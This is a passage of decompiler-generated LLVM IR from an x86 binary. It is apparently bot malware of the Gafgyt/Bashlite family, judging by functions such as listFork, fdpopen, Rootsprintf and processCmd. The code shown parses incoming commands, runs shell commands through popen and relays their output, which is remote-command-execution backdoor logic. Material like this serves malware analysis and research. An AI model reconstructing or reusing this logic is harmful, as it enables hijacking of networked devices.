  %v2_804d349 = load i8, i8* %v1_804d349, align 1
  %v3_804d349 = zext i8 %v2_804d349 to i32
  %v5_804d349 = and i32 %v1_804d348, -256
  %v6_804d349 = or i32 %v3_804d349, %v5_804d349
  store i32 %v6_804d349, i32* %eax.global-to-local, align 4
  %v6_804d34b = icmp ult i8 %v2_804d349, 10
  store i1 %v6_804d34b, i1* %cf.global-to-local, align 1
  %v10_804d34b = icmp eq i8 %v2_804d349, 10
  br i1 %v10_804d34b, label %dec_label_pc_804d302, label %dec_label_pc_804d34f

dec_label_pc_804d34f:                             ; preds = %dec_label_pc_804d327
  store i32 %v1_804d335, i32* %eax.global-to-local, align 4
  %v3_804d366 = call i32 @_strlen(i8* %v5_804d2fd)
  %v4_804d366 = mul i32 %v3_804d366, -1
  %v1_804d36c = sub i32 0, %v4_804d366
  %v6_804d36d = sub i32 %v1_804d2fa, %v4_804d366
  %v11_804d36d = icmp ult i32 %v6_804d36d, %v1_804d36c
  store i1 %v11_804d36d, i1* %cf.global-to-local, align 1
  %v1_804d370 = add i32 %v6_804d36d, -1
  store i32 %v1_804d370, i32* %eax.global-to-local, align 4
  %v1_804d371 = inttoptr i32 %v1_804d370 to i8*
  %v2_804d371 = load i8, i8* %v1_804d371, align 1
  %v3_804d371 = zext i8 %v2_804d371 to i32
  %v5_804d371 = and i32 %v1_804d370, -256
  %v6_804d371 = or i32 %v3_804d371, %v5_804d371
  store i32 %v6_804d371, i32* %eax.global-to-local, align 4
  %v6_804d373 = icmp ult i8 %v2_804d371, 13
  store i1 %v6_804d373, i1* %cf.global-to-local, align 1
  %v10_804d373 = icmp eq i8 %v2_804d371, 13
  br i1 %v10_804d373, label %dec_label_pc_804d302, label %dec_label_pc_804d377

dec_label_pc_804d377:                             ; preds = %dec_label_pc_804d34f
  store i32 %v1_804d2fa, i32* %eax.global-to-local, align 4
  %v2_804d385225 = load i8, i8* %v5_804d2fd, align 1
  %v3_804d385226 = zext i8 %v2_804d385225 to i32
  %v6_804d385228 = or i32 %v3_804d385226, %v1_804d335
  store i32 %v6_804d385228, i32* %eax.global-to-local, align 4
  %v3_804d387229 = icmp ult i8 %v2_804d385225, 32
  store i1 %v3_804d387229, i1* %cf.global-to-local, align 1
  %v7_804d387230 = icmp eq i8 %v2_804d385225, 32
  br i1 %v7_804d387230, label %dec_label_pc_804d394, label %dec_label_pc_804d38b

dec_label_pc_804d37f:                             ; preds = %dec_label_pc_804d38b
  %v5_804d37f = add i32 %v4_804d382232, 1
  %v22_804d37f = inttoptr i32 %v5_804d37f to i8*
  store i32 %v5_804d37f, i32* %eax.global-to-local, align 4
  %v2_804d385 = load i8, i8* %v22_804d37f, align 1
  %v3_804d385 = zext i8 %v2_804d385 to i32
  %v5_804d385 = and i32 %v5_804d37f, -256
  %v6_804d385 = or i32 %v3_804d385, %v5_804d385
  store i32 %v6_804d385, i32* %eax.global-to-local, align 4
  %v3_804d387 = icmp ult i8 %v2_804d385, 32
  store i1 %v3_804d387, i1* %cf.global-to-local, align 1
  %v7_804d387 = icmp eq i8 %v2_804d385, 32
  br i1 %v7_804d387, label %dec_label_pc_804d394, label %dec_label_pc_804d38b

dec_label_pc_804d38b:                             ; preds = %dec_label_pc_804d377, %dec_label_pc_804d37f
  %v5_804d385233 = phi i32 [ %v5_804d385, %dec_label_pc_804d37f ], [ %v1_804d335, %dec_label_pc_804d377 ]
  %v4_804d382232 = phi i32 [ %v5_804d37f, %dec_label_pc_804d37f ], [ %v1_804d2fa, %dec_label_pc_804d377 ]
  %stack_var_-64.1231 = phi i8* [ %v22_804d37f, %dec_label_pc_804d37f ], [ %v5_804d2fd, %dec_label_pc_804d377 ]
  store i32 %v4_804d382232, i32* %eax.global-to-local, align 4
  %v2_804d38e = load i8, i8* %stack_var_-64.1231, align 1
  %v3_804d38e = zext i8 %v2_804d38e to i32
  %v6_804d38e = or i32 %v3_804d38e, %v5_804d385233
  store i32 %v6_804d38e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d390 = icmp eq i8 %v2_804d38e, 0
  %v1_804d392 = icmp eq i1 %v4_804d390, false
  br i1 %v1_804d392, label %dec_label_pc_804d37f, label %dec_label_pc_804d394

dec_label_pc_804d394:                             ; preds = %dec_label_pc_804d37f, %dec_label_pc_804d38b, %dec_label_pc_804d377
  %stack_var_-64.1.lcssa = phi i8* [ %v5_804d2fd, %dec_label_pc_804d377 ], [ %stack_var_-64.1231, %dec_label_pc_804d38b ], [ %v22_804d37f, %dec_label_pc_804d37f ]
  %v4_804d382.lcssa = phi i32 [ %v1_804d2fa, %dec_label_pc_804d377 ], [ %v4_804d382232, %dec_label_pc_804d38b ], [ %v5_804d37f, %dec_label_pc_804d37f ]
  store i8 0, i8* %stack_var_-64.1.lcssa, align 1
  %v5_804d39a = add i32 %v4_804d382.lcssa, 1
  store i32 %v1_804d2fa, i32* %eax.global-to-local, align 4
  %v2_804d3c8239 = load i8, i8* %v5_804d2fd, align 1
  %v3_804d3c8240 = zext i8 %v2_804d3c8239 to i32
  %v6_804d3c8242 = or i32 %v3_804d3c8240, %v1_804d335
  store i32 %v6_804d3c8242, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d3ca243 = icmp eq i8 %v2_804d3c8239, 0
  %v1_804d3cc244 = icmp eq i1 %v4_804d3ca243, false
  br i1 %v1_804d3cc244, label %dec_label_pc_804d3a5, label %dec_label_pc_804d3ce

dec_label_pc_804d3a5:                             ; preds = %dec_label_pc_804d394, %dec_label_pc_804d3a5
  %storemerge15246 = phi i8* [ %storemerge15, %dec_label_pc_804d3a5 ], [ %v5_804d2fd, %dec_label_pc_804d394 ]
  %storemerge15.in245 = phi i32 [ %v5_804d3c2, %dec_label_pc_804d3a5 ], [ %v1_804d2fa, %dec_label_pc_804d394 ]
  store i32 %storemerge15.in245, i32* %eax.global-to-local, align 4
  %v2_804d3a8 = load i8, i8* %storemerge15246, align 1
  %v3_804d3a8 = zext i8 %v2_804d3a8 to i32
  store i32 %v3_804d3a8, i32* %eax.global-to-local, align 4
  %v0_804d3af = load i32, i32* @esp, align 4
  %v5_804d3af = icmp ult i32 %v0_804d3af, 12
  store i1 %v5_804d3af, i1* %cf.global-to-local, align 1
  %v2_804d3b2 = add i32 %v0_804d3af, -16
  %v3_804d3b2 = inttoptr i32 %v2_804d3b2 to i32*
  store i32 %v3_804d3a8, i32* %v3_804d3b2, align 4
  %v2_804d3b3 = call i32 @__GI_toupper(i32 %storemerge15.in245)
  %v0_804d3b8 = load i32, i32* @esp, align 4
  %v2_804d3b8 = icmp ugt i32 %v0_804d3b8, -17
  store i1 %v2_804d3b8, i1* %cf.global-to-local, align 1
  %v1_804d3bb = urem i32 %v2_804d3b3, 256
  %v2_804d3bb = load i32, i32* @edx, align 4
  %v3_804d3bb = and i32 %v2_804d3bb, -256
  %v4_804d3bb = or i32 %v3_804d3bb, %v1_804d3bb
  store i32 %v4_804d3bb, i32* @edx, align 4
  %v1_804d3c0 = trunc i32 %v2_804d3b3 to i8
  store i8 %v1_804d3c0, i8* %storemerge15246, align 1
  %v5_804d3c2 = add i32 %storemerge15.in245, 1
  %storemerge15 = inttoptr i32 %v5_804d3c2 to i8*
  store i32 %v5_804d3c2, i32* %eax.global-to-local, align 4
  %v2_804d3c8 = load i8, i8* %storemerge15, align 1
  %v3_804d3c8 = zext i8 %v2_804d3c8 to i32
  %v5_804d3c8 = and i32 %v5_804d3c2, -256
  %v6_804d3c8 = or i32 %v3_804d3c8, %v5_804d3c8
  store i32 %v6_804d3c8, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d3ca = icmp eq i8 %v2_804d3c8, 0
  %v1_804d3cc = icmp eq i1 %v4_804d3ca, false
  br i1 %v1_804d3cc, label %dec_label_pc_804d3a5, label %dec_label_pc_804d3ce

dec_label_pc_804d3ce:                             ; preds = %dec_label_pc_804d3a5, %dec_label_pc_804d394
  %v22_804d39a = inttoptr i32 %v5_804d39a to i8*
  store i32 %v1_804d2fa, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804d2fa, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8056771.184 to i32), i32* @edi, align 4
  %v7_804d3fe = call i32 @_strncmp(i8* %v5_804d2fd, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056771.184, i32 0, i32 0), i32 11)
  %v8_804d3fe = urem i32 %v7_804d3fe, 2
  %v9_804d3fe = icmp eq i32 %v8_804d3fe, 0
  %v0_804d400 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d400 = or i1 %v0_804d400, %v9_804d3fe
  %v3_804d400 = zext i1 %v2_804d400 to i32
  %v4_804d400 = load i32, i32* @edx, align 4
  %v5_804d400 = and i32 %v4_804d400, -256
  %v6_804d400 = or i32 %v3_804d400, %v5_804d400
  %v7_804d400 = xor i32 %v6_804d400, 1
  store i32 %v7_804d400, i32* @edx, align 4
  %v3_804d406 = and i32 %v7_804d3fe, -256
  %v1_804d408 = trunc i32 %v7_804d400 to i8
  %v3_804d408 = zext i1 %v0_804d400 to i8
  %v4_804d408 = sub nsw i8 %v1_804d408, %v3_804d408
  %v15_804d408 = icmp eq i8 %v4_804d408, 0
  %v20_804d408 = zext i8 %v4_804d408 to i32
  %v23_804d408 = or i32 %v20_804d408, %v3_804d406
  store i32 %v23_804d408, i32* @ecx, align 4
  %v2_804d40c = sext i8 %v4_804d408 to i32
  store i32 %v2_804d40c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d411 = icmp eq i1 %v15_804d408, false
  br i1 %v1_804d411, label %dec_label_pc_804d507, label %dec_label_pc_804d417

dec_label_pc_804d417:                             ; preds = %dec_label_pc_804d3ce
  %v0_804d417 = call i32 @listFork()
  store i32 %v0_804d417, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d41c = icmp eq i32 %v0_804d417, 0
  %v1_804d41e = icmp eq i1 %v1_804d41c, false
  br i1 %v1_804d41e, label %dec_label_pc_804d631.outer26, label %dec_label_pc_804d424

dec_label_pc_804d424:                             ; preds = %dec_label_pc_804d417
  store i32 %v2_804d424, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804d431 = load i32, i32* @esp, align 4
  %v5_804d431 = icmp ult i32 %v0_804d431, 4
  store i1 %v5_804d431, i1* %cf.global-to-local, align 1
  %v2_804d434 = add i32 %v0_804d431, -8
  %v3_804d434 = inttoptr i32 %v2_804d434 to i32*
  store i32 1024, i32* %v3_804d434, align 4
  %v1_804d435 = add i32 %v0_804d431, -12
  %v2_804d435 = inttoptr i32 %v1_804d435 to i32*
  store i32 0, i32* %v2_804d435, align 4
  %v2_804d437 = add i32 %v0_804d431, -16
  %v3_804d437 = inttoptr i32 %v2_804d437 to i32*
  store i32 %v2_804d424, i32* %v3_804d437, align 4
  %v5_804d438 = call i32 @__GI_memset(i8* inttoptr (i32 11 to i8*), i32 ptrtoint ([11 x i8]* @global_var_8056771.184 to i32), i32 %v1_804d2fa)
  %v0_804d43d = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805677c.185 to i32), i32* %eax.global-to-local, align 4
  %tmp278 = and i32 %v0_804d43d, -4
  %v5_804d445 = icmp eq i32 %tmp278, -16
  store i1 %v5_804d445, i1* %cf.global-to-local, align 1
  %v6_804d448 = add i32 %v0_804d43d, 8
  %v7_804d448 = inttoptr i32 %v6_804d448 to i32*
  store i32 %v5_804d39a, i32* %v7_804d448, align 4
  %v0_804d44b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d44b = add i32 %v0_804d43d, 4
  %v3_804d44b = inttoptr i32 %v2_804d44b to i32*
  store i32 %v0_804d44b, i32* %v3_804d44b, align 4
  store i32 %v2_804d424, i32* %eax.global-to-local, align 4
  %v3_804d452 = inttoptr i32 %v0_804d43d to i32*
  store i32 %v2_804d424, i32* %v3_804d452, align 4
  %v7_804d453 = call i32 @szprintf(i32 11, i32 ptrtoint ([11 x i8]* @global_var_8056771.184 to i32), i32 %v1_804d2fa, i32 %v1_804d2fa, i32 %v1_804d2fa, i32 %stack_var_-5832.1)
  %v0_804d458 = load i32, i32* @esp, align 4
  %tmp279 = and i32 %v0_804d458, -8
  %v5_804d460 = icmp eq i32 %tmp279, -16
  store i1 %v5_804d460, i1* %cf.global-to-local, align 1
  %v2_804d463 = add i32 %v0_804d458, 4
  %v3_804d463 = inttoptr i32 %v2_804d463 to i32*
  store i32 ptrtoint (i32* @global_var_80566c0.174 to i32), i32* %v3_804d463, align 4
  store i32 %v2_804d424, i32* @eax, align 4
  %v3_804d46a = inttoptr i32 %v0_804d458 to i32*
  store i32 %v2_804d424, i32* %v3_804d46a, align 4
  %v0_804d46b = call i32 @fdpopen()
  store i32 %v0_804d46b, i32* %eax.global-to-local, align 4
  %v3_804d4bc = inttoptr i32 %v0_804d46b to i8*
  br label %dec_label_pc_804d4d1

dec_label_pc_804d478:                             ; preds = %dec_label_pc_804d4d1
  store i32 %v2_804d424, i32* %eax.global-to-local, align 4
  %v5_804d47e = icmp ult i32 %v1_804d4e8, 12
  store i1 %v5_804d47e, i1* %cf.global-to-local, align 1
  %v3_804d481 = inttoptr i32 %v0_804d4e8 to i32*
  store i32 %v2_804d424, i32* %v3_804d481, align 4
  %v0_804d482 = call i32 @trim()
  %v0_804d487 = load i32, i32* @esp, align 4
  %v0_804d48a = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804d48a, i32* %edx.global-to-local, align 4
  %tmp280 = and i32 %v0_804d487, -4
  %v5_804d490 = icmp eq i32 %tmp280, -16
  store i1 %v5_804d490, i1* %cf.global-to-local, align 1
  store i32 %v2_804d424, i32* %eax.global-to-local, align 4
  %v2_804d499 = add i32 %v0_804d487, 8
  %v3_804d499 = inttoptr i32 %v2_804d499 to i32*
  store i32 %v2_804d424, i32* %v3_804d499, align 4
  %v1_804d49a = add i32 %v0_804d487, 4
  %v2_804d49a = inttoptr i32 %v1_804d49a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8056784.186 to i32), i32* %v2_804d49a, align 4
  %v0_804d49f = load i32, i32* %edx.global-to-local, align 4
  %v3_804d49f = inttoptr i32 %v0_804d487 to i32*
  store i32 %v0_804d49f, i32* %v3_804d49f, align 4
  %v2_804d4a0 = call i32 @Rootsprintf(i32 %v0_804d46b, i32 %stack_var_-28.1.ph)
  %v0_804d4a5 = load i32, i32* @esp, align 4
  store i32 %v2_804d424, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %tmp281 = and i32 %v0_804d4a5, -4
  %v5_804d4b5 = icmp eq i32 %tmp281, -16
  store i1 %v5_804d4b5, i1* %cf.global-to-local, align 1
  %v2_804d4b8 = add i32 %v0_804d4a5, 8
  %v3_804d4b8 = inttoptr i32 %v2_804d4b8 to i32*
  store i32 1024, i32* %v3_804d4b8, align 4
  %v1_804d4b9 = add i32 %v0_804d4a5, 4
  %v2_804d4b9 = inttoptr i32 %v1_804d4b9 to i32*
  store i32 0, i32* %v2_804d4b9, align 4
  %v3_804d4bb = inttoptr i32 %v0_804d4a5 to i32*
  store i32 %v2_804d424, i32* %v3_804d4bb, align 4
  %v2_804d4bc = load i32, i32* %stack_var_-24, align 4
  %v4_804d4bc = call i32 @__GI_memset(i8* %v3_804d4bc, i32 %stack_var_-28.1.ph, i32 %v2_804d4bc)
  store i32 %v4_804d4bc, i32* %eax.global-to-local, align 4
  %v0_804d4c1 = load i32, i32* @esp, align 4
  %v1_804d4c1 = add i32 %v0_804d4c1, 16
  %v5_804d4c4 = icmp ult i32 %v1_804d4c1, 12
  store i1 %v5_804d4c4, i1* %cf.global-to-local, align 1
  %v2_804d4c7 = inttoptr i32 %v0_804d4c1 to i32*
  store i32 1, i32* %v2_804d4c7, align 4
  %v0_804d4c9 = call i32 @sleep()
  store i32 %v0_804d4c9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d4d1

dec_label_pc_804d4d1:                             ; preds = %dec_label_pc_804d424, %dec_label_pc_804d478
  %storemerge23.in.in = load i32, i32* @esp, align 4
  %tmp282 = and i32 %storemerge23.in.in, -4
  %v5_804d4d1 = icmp eq i32 %tmp282, -16
  store i1 %v5_804d4d1, i1* %cf.global-to-local, align 1
  %v5_804d4d4 = add i32 %storemerge23.in.in, 8
  %v6_804d4d4 = inttoptr i32 %v5_804d4d4 to i32*
  store i32 %v0_804d46b, i32* %v6_804d4d4, align 4
  %v1_804d4d7 = add i32 %storemerge23.in.in, 4
  %v2_804d4d7 = inttoptr i32 %v1_804d4d7 to i32*
  store i32 1024, i32* %v2_804d4d7, align 4
  store i32 %v2_804d424, i32* %eax.global-to-local, align 4
  %v3_804d4e2 = inttoptr i32 %storemerge23.in.in to i32*
  store i32 %v2_804d424, i32* %v3_804d4e2, align 4
  %v2_804d4e3 = load i32, i32* %stack_var_-24, align 4
  %v3_804d4e3 = call i32 @fdgets(i32 %v0_804d46b, i32 %stack_var_-28.1.ph, i32 %v2_804d4e3)
  store i32 %v3_804d4e3, i32* %eax.global-to-local, align 4
  %v0_804d4e8 = load i32, i32* @esp, align 4
  %v1_804d4e8 = add i32 %v0_804d4e8, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d4eb = icmp eq i32 %v3_804d4e3, 0
  %v1_804d4ed = icmp eq i1 %v1_804d4eb, false
  br i1 %v1_804d4ed, label %dec_label_pc_804d478, label %dec_label_pc_804d4ef

dec_label_pc_804d4ef:                             ; preds = %dec_label_pc_804d4d1
  %v5_804d4ef = icmp ult i32 %v1_804d4e8, 12
  store i1 %v5_804d4ef, i1* %cf.global-to-local, align 1
  %v6_804d4f2 = inttoptr i32 %v0_804d4e8 to i32*
  store i32 %v0_804d46b, i32* %v6_804d4f2, align 4
  %v0_804d4f5 = call i32 @fdpclose()
  store i32 %v0_804d4f5, i32* @eax, align 4
  %v0_804d4fa = load i32, i32* @esp, align 4
  %v1_804d4fa = add i32 %v0_804d4fa, 16
  %v5_804d4fd = icmp ult i32 %v1_804d4fa, 12
  store i1 %v5_804d4fd, i1* %cf.global-to-local, align 1
  %v2_804d500 = inttoptr i32 %v0_804d4fa to i32*
  store i32 0, i32* %v2_804d500, align 4
  %v1_804d502 = call i32 @__GI_exit(i32 %v0_804d46b)
  store i32 %v1_804d502, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d507

dec_label_pc_804d507:                             ; preds = %dec_label_pc_804d3ce, %dec_label_pc_804d4ef
  store i32 %v5_804d39a, i32* @eax, align 4
  %v0_804d511 = load i32, i32* @esp, align 4
  %v5_804d511 = icmp ult i32 %v0_804d511, 8
  store i1 %v5_804d511, i1* %cf.global-to-local, align 1
  %v1_804d514 = add i32 %v0_804d511, -12
  %v2_804d514 = inttoptr i32 %v1_804d514 to i32*
  store i32 ptrtoint (i32* @global_var_8056787.187 to i32), i32* %v2_804d514, align 4
  %v0_804d519 = load i32, i32* @eax, align 4
  %v2_804d519 = add i32 %v0_804d511, -16
  %v3_804d519 = inttoptr i32 %v2_804d519 to i32*
  store i32 %v0_804d519, i32* %v3_804d519, align 4
  %v1_804d51a = load i8*, i8** %stack_var_-36, align 4
  %v2_804d51a = ptrtoint i8* %v1_804d51a to i32
  %v3_804d51a = call i32 @__GI_strtok(i32 1, i32 %v2_804d51a)
  %v0_804d51f = load i32, i32* @esp, align 4
  %v1_804d51f = add i32 %v0_804d51f, 16
  %v5_804d522 = inttoptr i32 %v3_804d51a to i8*
  store i8* %v5_804d522, i8** %stack_var_-36, align 4
  store i32 %v1_804d2fa, i32* %eax.global-to-local, align 4
  store i32 %v1_804d2fa, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d5db65 = icmp eq i32 %v3_804d51a, 0
  %v1_804d5df72 = icmp eq i1 %v5_804d5db65, false
  br i1 %v1_804d5df72, label %dec_label_pc_804d533, label %dec_label_pc_804d5e5

dec_label_pc_804d533:                             ; preds = %dec_label_pc_804d507, %dec_label_pc_804d5c6
  %v0_804d5c698 = phi i32 [ %v1_804d5d5, %dec_label_pc_804d5c6 ], [ %v1_804d51f, %dec_label_pc_804d507 ]
  %v3_804d543 = phi i8* [ %tmp193, %dec_label_pc_804d5c6 ], [ %v5_804d522, %dec_label_pc_804d507 ]
  %stack_var_-40.173 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804d5c6 ], [ 1, %dec_label_pc_804d507 ]
  %v4_804d533 = ptrtoint i8* %v3_804d543 to i32
  store i32 %v4_804d533, i32* %eax.global-to-local, align 4
  %v2_804d536 = load i8, i8* %v3_804d543, align 1
  %v3_804d536 = zext i8 %v2_804d536 to i32
  %v5_804d536 = and i32 %v4_804d533, -256
  %v6_804d536 = or i32 %v3_804d536, %v5_804d536
  store i32 %v6_804d536, i32* @eax, align 4
  %v6_804d538 = icmp ult i8 %v2_804d536, 10
  store i1 %v6_804d538, i1* %cf.global-to-local, align 1
  %v10_804d538 = icmp eq i8 %v2_804d536, 10
  br i1 %v10_804d538, label %dec_label_pc_804d5c6, label %dec_label_pc_804d540

dec_label_pc_804d540:                             ; preds = %dec_label_pc_804d533
  store i32 %stack_var_-40.173, i32* @ebx, align 4
  store i32 %v5_804d536, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d533, i32* @edi, align 4
  %v3_804d55a = call i32 @_strlen(i8* %v3_804d543)
  %v1_804d55e = add i32 %v3_804d55a, 1
  store i32 %v1_804d55e, i32* %eax.global-to-local, align 4
  %v0_804d562 = load i32, i32* @esp, align 4
  %v5_804d562 = icmp ult i32 %v0_804d562, 12
  store i1 %v5_804d562, i1* %cf.global-to-local, align 1
  %v2_804d565 = add i32 %v0_804d562, -16
  %v3_804d565 = inttoptr i32 %v2_804d565 to i32*
  store i32 %v1_804d55e, i32* %v3_804d565, align 4
  %v2_804d566 = call i32 @malloc(i32 %v4_804d533)
  %v0_804d56b = load i32, i32* @esp, align 4
  %v2_804d56b = icmp ugt i32 %v0_804d56b, -17
  store i1 %v2_804d56b, i1* %cf.global-to-local, align 1
  %v1_804d56e = load i32, i32* @ebp, align 4
  %v2_804d56e = load i32, i32* @ebx, align 4
  %v3_804d56e = mul i32 %v2_804d56e, 4
  %v4_804d56e = add i32 %v1_804d56e, -616
  %v5_804d56e = add i32 %v4_804d56e, %v3_804d56e
  %v6_804d56e = inttoptr i32 %v5_804d56e to i32*
  store i32 %v2_804d566, i32* %v6_804d56e, align 4
  %v3_804d575 = load i8*, i8** %stack_var_-36, align 4
  %v4_804d575 = ptrtoint i8* %v3_804d575 to i32
  %v1_804d583 = and i32 %v4_804d575, -256
  store i32 %v1_804d583, i32* %eax.global-to-local, align 4
  %v3_804d58c = call i32 @_strlen(i8* %v3_804d575)
  %v1_804d590 = add i32 %v3_804d58c, 1
  store i32 %v1_804d590, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.173, i32* %eax.global-to-local, align 4
  %v0_804d599 = load i32, i32* @ebp, align 4
  %v2_804d599 = mul i32 %stack_var_-40.173, 4
  %v3_804d599 = add i32 %v2_804d599, -616
  %v4_804d599 = add i32 %v0_804d599, %v3_804d599
  %v5_804d599 = inttoptr i32 %v4_804d599 to i32*
  %v6_804d599 = load i32, i32* %v5_804d599, align 4
  %v1_804d5a0 = inttoptr i32 %v6_804d599 to i8*
  store i32 %v6_804d599, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804d5a5 = and i32 %v6_804d599, -256
  store i32 %v1_804d5a5, i32* %eax.global-to-local, align 4
  %v5_804d5a7 = call i8* @_memset(i8* %v1_804d5a0, i32 %v1_804d5a5, i32 %v1_804d590)
  %v6_804d5a7 = ptrtoint i8* %v5_804d5a7 to i32
  store i32 %v6_804d5a7, i32* @ecx, align 4
  store i32 %v4_804d575, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.173, i32* %eax.global-to-local, align 4
  %v0_804d5af = load i32, i32* @ebp, align 4
  %v4_804d5af = add i32 %v0_804d5af, %v3_804d599
  %v5_804d5af = inttoptr i32 %v4_804d5af to i32*
  %v6_804d5af = load i32, i32* %v5_804d5af, align 4
  store i32 %v6_804d5af, i32* @eax, align 4
  %v0_804d5b6 = load i32, i32* @esp, align 4
  %v5_804d5b6 = icmp ult i32 %v0_804d5b6, 8
  store i1 %v5_804d5b6, i1* %cf.global-to-local, align 1
  %v2_804d5b9 = add i32 %v0_804d5b6, -12
  %v3_804d5b9 = inttoptr i32 %v2_804d5b9 to i32*
  store i32 %v4_804d575, i32* %v3_804d5b9, align 4
  %v0_804d5ba = load i32, i32* @eax, align 4
  %v2_804d5ba = add i32 %v0_804d5b6, -16
  %v3_804d5ba = inttoptr i32 %v2_804d5ba to i32*
  store i32 %v0_804d5ba, i32* %v3_804d5ba, align 4
  %v5_804d5bb = call i32 @strcpy(i8* %v3_804d575, i32 %v4_804d533)
  store i32 %v5_804d5bb, i32* @eax, align 4
  %v0_804d5c0 = load i32, i32* @esp, align 4
  %v1_804d5c0 = add i32 %v0_804d5c0, 16
  %v2_804d5c0 = icmp ugt i32 %v0_804d5c0, -17
  store i1 %v2_804d5c0, i1* %cf.global-to-local, align 1
  %v4_804d5c3 = add i32 %stack_var_-40.173, 1
  br label %dec_label_pc_804d5c6

dec_label_pc_804d5c6:                             ; preds = %dec_label_pc_804d533, %dec_label_pc_804d540
  %v0_804d5c6 = phi i32 [ %v0_804d5c698, %dec_label_pc_804d533 ], [ %v1_804d5c0, %dec_label_pc_804d540 ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.173, %dec_label_pc_804d533 ], [ %v4_804d5c3, %dec_label_pc_804d540 ]
  %v5_804d5c6 = icmp ult i32 %v0_804d5c6, 8
  store i1 %v5_804d5c6, i1* %cf.global-to-local, align 1
  %v1_804d5c9 = add i32 %v0_804d5c6, -12
  %v2_804d5c9 = inttoptr i32 %v1_804d5c9 to i32*
  store i32 ptrtoint (i32* @global_var_8056787.187 to i32), i32* %v2_804d5c9, align 4
  %v1_804d5ce = add i32 %v0_804d5c6, -16
  %v2_804d5ce = inttoptr i32 %v1_804d5ce to i32*
  store i32 0, i32* %v2_804d5ce, align 4
  %v1_804d5d0 = load i8*, i8** %stack_var_-36, align 4
  %v2_804d5d0 = ptrtoint i8* %v1_804d5d0 to i32
  %v3_804d5d0 = call i32 @__GI_strtok(i32 %stack_var_-40.0, i32 %v2_804d5d0)
  store i32 %v3_804d5d0, i32* %eax.global-to-local, align 4
  %v0_804d5d5 = load i32, i32* @esp, align 4
  %v1_804d5d5 = add i32 %v0_804d5d5, 16
  store i32 %v3_804d5d0, i32* %tmp191, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d5db = icmp eq i32 %v3_804d5d0, 0
  %v1_804d5df = icmp eq i1 %v5_804d5db, false
  %tmp193 = inttoptr i32 %v3_804d5d0 to i8*
  br i1 %v1_804d5df, label %dec_label_pc_804d533, label %dec_label_pc_804d5e5

dec_label_pc_804d5e5:                             ; preds = %dec_label_pc_804d5c6, %dec_label_pc_804d507
  %v0_804d5e5 = phi i32 [ %v1_804d51f, %dec_label_pc_804d507 ], [ %v1_804d5d5, %dec_label_pc_804d5c6 ]
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804d507 ], [ %stack_var_-40.0, %dec_label_pc_804d5c6 ]
  %v5_804d5e5 = icmp ult i32 %v0_804d5e5, 8
  store i1 %v5_804d5e5, i1* %cf.global-to-local, align 1
  store i32 %v2_804d5e8, i32* %eax.global-to-local, align 4
  %v2_804d5ee = add i32 %v0_804d5e5, -12
  %v3_804d5ee = inttoptr i32 %v2_804d5ee to i32*
  store i32 %v2_804d5e8, i32* %v3_804d5ee, align 4
  %v5_804d5ef = add i32 %v0_804d5e5, -16
  %v6_804d5ef = inttoptr i32 %v5_804d5ef to i32*
  store i32 %stack_var_-40.1.lcssa, i32* %v6_804d5ef, align 4
  %v0_804d5f2 = call i32 @processCmd()
  store i32 %v0_804d5f2, i32* %eax.global-to-local, align 4
  %v0_804d5f7 = load i32, i32* @esp, align 4
  %v9_804d5fa = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804d5fa, i1* %cf.global-to-local, align 1
  %v7_804d5fe = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804d5fe, label %dec_label_pc_804d610.lr.ph, label %dec_label_pc_804d631.outer26

dec_label_pc_804d610.lr.ph:                       ; preds = %dec_label_pc_804d5e5
  store i32 1, i32* %eax.global-to-local, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d610

dec_label_pc_804d610:                             ; preds = %dec_label_pc_804d610.lr.ph, %dec_label_pc_804d610
  %storemerge251 = phi i32 [ 1, %dec_label_pc_804d610.lr.ph ], [ %v4_804d626, %dec_label_pc_804d610 ]
  %v0_804d61a250.in = phi i32 [ %v0_804d5f7, %dec_label_pc_804d610.lr.ph ], [ %v0_804d623, %dec_label_pc_804d610 ]
  %v0_804d61a250 = add i32 %v0_804d61a250.in, 16
  store i32 %storemerge251, i32* %eax.global-to-local, align 4
  %v0_804d613 = load i32, i32* @ebp, align 4
  %v2_804d613 = mul i32 %storemerge251, 4
  %v3_804d613 = add i32 %v2_804d613, -616
  %v4_804d613 = add i32 %v3_804d613, %v0_804d613
  %v5_804d613 = inttoptr i32 %v4_804d613 to i32*
  %v6_804d613 = load i32, i32* %v5_804d613, align 4
  store i32 %v6_804d613, i32* %eax.global-to-local, align 4
